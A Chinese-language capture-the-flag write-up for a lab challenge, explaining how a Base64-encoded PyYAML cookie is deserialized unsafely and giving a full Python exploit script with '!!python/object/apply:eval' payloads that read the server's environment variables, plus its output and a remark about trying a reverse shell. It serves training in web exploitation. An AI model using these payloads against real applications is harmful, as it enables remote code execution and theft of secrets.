### 1. 题目描述

目标是利用 YAML 反序列化漏洞读取服务器环境变量中的 FLAG。该系统将序列化的对象存储在 `bookmarks` Cookie 中，Cookie 内容经 Base64 编码，且使用 PyYAML 进行反序列化，未做安全防护，可通过构造恶意 YAML  payload 执行代码获取 flag。

### 2. 知识点

- YAML 反序列化漏洞原理（PyYAML）
- Base64 编码/解码（Cookie 内容处理）
- 环境变量读取（`os.environ.get`）
- 反序列化代码执行（`!!python/object/apply` 标记）

### 3. 题目解题方法思路

核心路径为“分析 Cookie 格式→构造恶意 YAML payload→Base64 编码 payload→设置 Cookie 发送请求→提取 flag”。先解码 `bookmarks`​ Cookie 确认其为 YAML 序列化格式（含 `!!python/object`​ 标记）；再利用 PyYAML 的 `!!python/object/apply`​ 标记构造 payload，调用 `eval`​ 函数读取 `os.environ`​ 中的 FLAG；对 payload 进行 Base64 编码后设置到 `bookmarks`​ Cookie；最后访问 `/list` 接口触发反序列化，从响应中提取 flag。工具可使用 Base64 编码工具、浏览器开发者工具（设置 Cookie）或 Python 脚本自动化操作。

### 4. 解题步骤

1. 分析 Cookie 格式：访问目标页面 `http://ip32837`​，添加书签后，通过浏览器开发者工具查看 `bookmarks`​ Cookie，发现其内容以 `==`​ 结尾，Base64 解码后为 YAML 格式（含 `!!python/object:app.models.UrlObj`​ 标记），确认使用 PyYAML 反序列化。![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-075-24\exp.assets\image-x12183253-l1uqzv3.png)

   ![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-075-24\exp.assets\image-x12183347-97h48x4.png)

2. 构造恶意 YAML payload：利用 `!!python/object/apply:eval`​ 调用 `eval`​ 函数，执行 `__import__("os").environ.get("FLAG", "NOT_FOUND")`​ 读取环境变量中的 FLAG，并将结果赋值给 `UrlObj`​ 的 `name`​ 和 `url` 字段（确保结果随页面渲染输出）。

3. Base64 编码 payload：将构造好的 YAML  payload 按 ISO-8859-1 编码格式进行 Base64 编码（匹配系统编码方式）。

4. 设置 Cookie 并发送请求：在浏览器开发者工具中，将编码后的 payload 设置到 `bookmarks`​ Cookie，同时设置 `user=exploit`​ Cookie，访问 `/list` 接口。

5. 提取 flag：页面响应中会显示 `name`​ 或 `url` 字段的内容，即 FLAG  value，提取即可。若未成功，可尝试备选 payload（通过 AttributeError 泄露 FLAG）。

‍


**YAML格式解析**

1.  **​`!!python/object`​** - PyYAML 的对象标记

   - 这是 PyYAML 特有的语法
   - 表示序列化的是 Python 对象
2. **​`app.models.UrlObj`​** - 完整的 Python 类名

   - 暴露了应用的内部结构
   - 说明使用了 Python 对象序列化
3. **YAML 格式** - 不是 JSON

   - 键值对格式: `name: ‘1’`​ (不是 `"name": "1"`)
   - 使用缩进而不是花括号

**结论: 这明确表明使用了 PyYAML 的对象序列化功能!**

![image](D:/05-dev_home/AI_Pentest/xbow题解知识库/同学们解的题/xbow-ck.md/wp/assets/image-x12183347-97h48x4.png)

### 5. exp（Python 脚本）

YAML 里面 `!!python/object/apply` ​可以执行任何命令，尝试之后发现没有任何过滤，exp 如下：

```python
#!/usr/bin/env python3
"""
X-075-24 Exploit - YAML Deserialization
"""

import requests
import base64
import re

TARGET_URL = "http://ip32837"

print("[*] X-075-24 YAML反序列化漏洞利用")
print(f"[*] 目标: {TARGET_URL}\n")

# 最有效的payload: 使用UrlObj对象,将FLAG放入name和url字段
print("[+] 使用UrlObj对象携带FLAG到HTML页面")
payload = """
- !!python/object:app.models.UrlObj
  name: !!python/object/apply:eval ['__import__("os").environ.get("FLAG", "NOT_FOUND")']
  url: !!python/object/apply:eval ['__import__("os").environ.get("FLAG", "NOT_FOUND")']
"""

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
cookies = {'bookmarks': encoded, 'user': 'exploit'}

try:
    r = requests.get(f"{TARGET_URL}/list", cookies=cookies, timeout=5)
    print(f"状态码: {r.status_code}\n")
    
    # 查找所有可能的flag格式
    flags = re.findall(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    
    if flags:
        print(f"[SUCCESS] 找到FLAG!")
        print(f"\n{'='*60}")
        for flag in set(flags):  # 使用set去重
            print(f"FLAG: {flag}")
        print(f"{'='*60}\n")
    else:
        # 如果没找到标准格式的flag,打印完整响应
        print("未找到标准格式flag,打印完整响应:")
        print(r.text)
        
except Exception as e:
    print(f"错误: {e}")

print("\n[*] 如果上面的payload没有成功,尝试反弹shell或其他方法...")

# 备选方案: 尝试通过错误信息泄露
print("\n[+] 备选: 通过AttributeError泄露FLAG")
payload2 = """
- !!python/object/apply:getattr
  args:
  - !!python/object/apply:eval
    args: ['__import__("os").environ']
  - FLAG
"""

encoded2 = base64.b64encode(payload2.encode('ISO-8859-1')).decode('ISO-8859-1')
cookies2 = {'bookmarks': encoded2, 'user': 'exploit'}

try:
    r = requests.get(f"{TARGET_URL}/list", cookies=cookies2, timeout=5)
    print(f"状态码: {r.status_code}")
    
    flags = re.findall(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flags:
        print(f"[SUCCESS] 找到FLAG: {flags[0]}")
        print(f"\n{'='*60}")
        print(f"FLAG: {flags[0]}")
        print(f"{'='*60}\n")
        
except Exception as e:
    print(f"错误: {e}")

```

‍

‍

```python
[*] X-075-24 YAML反序列化漏洞利用
[*] 目标: http://ip32837

[+] 使用UrlObj对象携带FLAG到HTML页面
状态码: 200

[SUCCESS] 找到FLAG!

============================================================
FLAG: FLAG
============================================================


[*] 如果上面的payload没有成功,尝试反弹shell或其他方法...

[+] 备选: 通过AttributeError泄露FLAG
状态码: 500
```

‍